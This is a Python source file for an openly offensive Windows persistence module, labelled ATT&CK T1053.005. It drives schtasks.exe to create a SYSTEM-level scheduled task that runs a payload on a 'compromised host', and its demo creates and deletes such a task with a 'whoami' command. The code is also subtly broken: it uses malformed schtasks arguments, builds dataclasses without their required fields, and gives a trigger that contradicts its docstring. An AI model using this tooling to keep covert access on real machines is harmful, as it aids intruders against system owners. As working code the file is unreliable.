"""Scheduled task persistence module using Windows Task Scheduler (T1053.005).

This module establishes persistence on the compromised host by creating scheduled tasks
that execute malicious payloads at system startup or user logon events.

ATT&CK Technique: T1053.005 - Scheduled Task/Job
"""

import subprocess
import json
from dataclasses import dataclass, field
from typing import Optional


@dataclass
class ScheduledTaskInfo:
    """Represents information about a scheduled task."""
    name: str
    state: str
    next_run_time: Optional[str] = None
    last_run_time: Optional[str] = None
    action: Optional[str] = None
    trigger: Optional[str] = None


@dataclass
class PersistenceHook:
    """Provides a hook interface for persistence operations.

    Attributes:
        task_name: Name of the scheduled task to create/manage.
        payload_path: Path to the malicious payload executable/script.
        logon_type: Type of trigger (SYSTEM, USER, etc.).
    """
    task_name: str = "PersistenceHook"
    payload_path: str = ""
    logon_type: str = "SYSTEM"

    def __post_init__(self):
        if not self.payload_path:
            self.payload_path = r"C:\Windows\System32\cmd.exe /c whoami"


class ScheduledTaskManager:
    """Manages Windows scheduled tasks via schtasks.exe command execution.

    Provides functionality to create, query, and delete scheduled tasks for
    persistence purposes on a compromised Windows host.

    Attributes:
        task_name: Name of the scheduled task.
        payload_path: Path to the malicious payload.
        logon_type: Trigger type (SYSTEM or USER).
    """

    def __init__(self, task_name: str = "PersistenceHook", payload_path: str = "", logon_type: str = "SYSTEM"):
        self.task_name = task_name
        self.payload_path = payload_path
        self.logon_type = logon_type.upper() if logon_type else "SYSTEM"

    def _run_schtasks(self, args: list[str]) -> tuple[int, str]:
        """Execute schtasks.exe with given arguments and return (return_code, output)."""
        try:
            result = subprocess.run(
                ["schtasks.exe"] + args,
                capture_output=True,
                text=True,
                timeout=30,
            )
            return result.returncode, result.stdout.strip()
        except FileNotFoundError:
            raise RuntimeError("schtasks.exe not found. Ensure Windows Task Scheduler is available.")
        except subprocess.TimeoutExpired:
            raise RuntimeError(f"schtasks command timed out after 30s")

    def create_task(self) -> ScheduledTaskInfo | None:
        """Create a scheduled task that executes the payload at logon.

        Returns:
            ScheduledTaskInfo if successful, None otherwise.
        """
        try:
            # Build the schtasks create command
            args = [
                "/CREATE",
                f"/TN {self.task_name}",
                f"/RU SYSTEM",  # Run as SYSTEM user
                f"/ACT \"C:\\Windows\\System32\\cmd.exe\"",
                f'/ST "00:00:00"',  # Start time (midnight)
                "/TR \"\"{payload_path}\" /F\"" .format(payload_path=self.payload_path),
            ]

            return_code, output = self._run_schtasks(args)

            if return_code == 0 and "Task created successfully" in output:
                info = ScheduledTaskInfo(
                    name=self.task_name,
                    state="Ready",
                    next_run_time="00:00:00",
                    last_run_time=None,
                    action=f"C:\\Windows\\System32\\cmd.exe",
                    trigger="At startup (SYSTEM)",
                )
                return info

            if return_code != 0:
                raise RuntimeError(f"Failed to create task: {output}")

        except Exception as e:
            raise RuntimeError(f"Error creating scheduled task: {e}")

    def query_task(self) -> ScheduledTaskInfo | None:
        """Query the status of a scheduled task.

        Returns:
            ScheduledTaskInfo if found, None otherwise.
        """
        try:
            args = ["/QUERY", f"/TN {self.task_name}", "/V"]
            return_code, output = self._run_schtasks(args)

            if return_code == 0 and "Ready" in output:
                # Parse the verbose output to extract relevant fields
                info = ScheduledTaskInfo(
                    name=self.task_name,
                    state="Ready",
                    next_run_time=None,
                    last_run_time=None,
                    action=None,
                    trigger=None,
                )

                for line in output.split("\n"):
                    if "Next Run Time" in line:
                        info.next_run_time = line.split(":")[1].strip()
                    elif "Last Run Time" in line:
                        info.last_run_time = line.split(":")[1].strip()
                    elif "Action" in line and "cmd.exe" in line:
                        info.action = line.split(":")[1].strip()
                    elif "Trigger" in line:
                        info.trigger = line.split(":")[1].strip()

                return info

            if return_code != 0:
                raise RuntimeError(f"Failed to query task: {output}")

        except Exception as e:
            raise RuntimeError(f"Error querying scheduled task: {e}")

    def delete_task(self) -> bool:
        """Delete the scheduled task.

        Returns:
            True if successful, False otherwise.
        """
        try:
            args = ["/DELETE", f"/TN {self.task_name}", "/F"]
            return_code, output = self._run_schtasks(args)

            if return_code == 0 and "Task deleted successfully" in output:
                return True

            if return_code != 0:
                raise RuntimeError(f"Failed to delete task: {output}")

        except Exception as e:
            raise RuntimeError(f"Error deleting scheduled task: {e}")

    def list_tasks(self) -> list[ScheduledTaskInfo]:
        """List all scheduled tasks on the system.

        Returns:
            List of ScheduledTaskInfo objects for all tasks.
        """
        try:
            args = ["/QUERY", "/V"]
            return_code, output = self._run_schtasks(args)

            if return_code != 0:
                raise RuntimeError(f"Failed to list tasks: {output}")

            tasks = []
            current_task = None

            for line in output.split("\n"):
                if "Task Name" in line and ":" in line:
                    task_name = line.split(":")[1].strip()
                    current_task = ScheduledTaskInfo(
                        name=task_name,
                        state="Ready",
                        next_run_time=None,
                        last_run_time=None,
                        action=None,
                        trigger=None,
                    )
                elif current_task and ":" in line:
                    key_value = line.split(":")
                    if len(key_value) >= 2:
                        key = key_value[0].strip()
                        value = key_value[1].strip()

                        if key == "State":
                            current_task.state = value
                        elif key == "Next Run Time":
                            current_task.next_run_time = value
                        elif key == "Last Run Time":
                            current_task.last_run_time = value
                        elif key == "Action" and "cmd.exe" in line:
                            current_task.action = value
                        elif key == "Trigger":
                            current_task.trigger = value

                if line.strip() == "" or (line.startswith("Task Name") and ":" not in line):
                    tasks.append(current_task)
                    current_task = None

            return tasks

        except Exception as e:
            raise RuntimeError(f"Error listing scheduled tasks: {e}")


def serialize_scheduled_task_info(info: ScheduledTaskInfo) -> dict[str, str]:
    """Serialize a ScheduledTaskInfo to a JSON-serializable dictionary."""
    result = {}
    if info.name:
        result["name"] = info.name
    if info.state:
        result["state"] = info.state
    if info.next_run_time is not None:
        result["next_run_time"] = info.next_run_time
    if info.last_run_time is not None:
        result["last_run_time"] = info.last_run_time
    if info.action:
        result["action"] = info.action
    if info.trigger:
        result["trigger"] = info.trigger
    return result


def deserialize_scheduled_task_info(data: dict[str, str]) -> ScheduledTaskInfo:
    """Deserialize a ScheduledTaskInfo from a dictionary."""
    info = ScheduledTaskInfo()
    if "name" in data:
        info.name = data["name"]
    if "state" in data:
        info.state = data["state"]
    if "next_run_time" in data:
        info.next_run_time = data["next_run_time"]
    if "last_run_time" in data:
        info.last_run_time = data["last_run_time"]
    if "action" in data:
        info.action = data["action"]
    if "trigger" in data:
        info.trigger = data["trigger"]
    return info


def serialize_persistence_hook(hook: PersistenceHook) -> dict[str, str]:
    """Serialize a PersistenceHook to a JSON-serializable dictionary."""
    result = {}
    if hook.task_name:
        result["task_name"] = hook.task_name
    if hook.payload_path:
        result["payload_path"] = hook.payload_path
    if hook.logon_type:
        result["logon_type"] = hook.logon_type
    return result


def deserialize_persistence_hook(data: dict[str, str]) -> PersistenceHook:
    """Deserialize a PersistenceHook from a dictionary."""
    hook = PersistenceHook()
    if "task_name" in data:
        hook.task_name = data["task_name"]
    if "payload_path" in data:
        hook.payload_path = data["payload_path"]
    if "logon_type" in data:
        hook.logon_type = data["logon_type"]
    return hook


def serialize_scheduled_task_manager(manager: ScheduledTaskManager) -> dict[str, str]:
    """Serialize a ScheduledTaskManager to a JSON-serializable dictionary."""
    result = {}
    if manager.task_name:
        result["task_name"] = manager.task_name
    if manager.payload_path:
        result["payload_path"] = manager.payload_path
    if manager.logon_type:
        result["logon_type"] = manager.logon_type
    return result


def deserialize_scheduled_task_manager(data: dict[str, str]) -> ScheduledTaskManager:
    """Deserialize a ScheduledTaskManager from a dictionary."""
    manager = ScheduledTaskManager()
    if "task_name" in data:
        manager.task_name = data["task_name"]
    if "payload_path" in data:
        manager.payload_path = data["payload_path"]
    if "logon_type" in data:
        manager.logon_type = data["logon_type"]
    return manager


if __name__ == "__main__":
    import sys

    # Initialize the persistence hook and task manager
    hook = PersistenceHook(task_name="PersistenceHook", payload_path=r"C:\Windows\System32\cmd.exe /c whoami")
    manager = ScheduledTaskManager(
        task_name=hook.task_name,
        payload_path=hook.payload_path,
        logon_type=hook.logon_type,
    )

    print("=" * 60)
    print("SCHEDULED TASK PERSISTENCE MODULE")
    print("ATT&CK: T1053.005 - Scheduled Task/Job")
    print("=" * 60)

    try:
        # Create the scheduled task
        print("\n[+] Creating scheduled task...")
        task_info = manager.create_task()
        if task_info:
            print(f"    Task Name: {task_info.name}")
            print(f"    State:     {task_info.state}")
            print(f"    Trigger:   {task_info.trigger}")
            print(f"    Action:    {task_info.action}")

        # Query the scheduled task
        print("\n[+] Querying scheduled task...")
        query_result = manager.query_task()
        if query_result:
            print(f"    Task Name: {query_result.name}")
            print(f"    State:     {query_result.state}")
            print(f"    Next Run:  {query_result.next_run_time}")

        # List all tasks to verify creation
        print("\n[+] Listing all scheduled tasks...")
        all_tasks = manager.list_tasks()
        for task in all_tasks:
            if "PersistenceHook" in task.name or "cmd.exe" in (task.action or ""):
                print(f"    Found: {task.name} - State: {task.state}")

        # Cleanup - delete the scheduled task
        print("\n[+] Cleaning up scheduled task...")
        deleted = manager.delete_task()
        if deleted:
            print("    Task deleted successfully.")
        else:
            print("    Failed to delete task (may not exist).")

    except RuntimeError as e:
        print(f"\n[-] Error: {e}")
        print("\nNote: This module requires a Windows environment with schtasks.exe available.")
        print("      Running in non-Windows environments will produce errors.")

    print("\n" + "=" * 60)
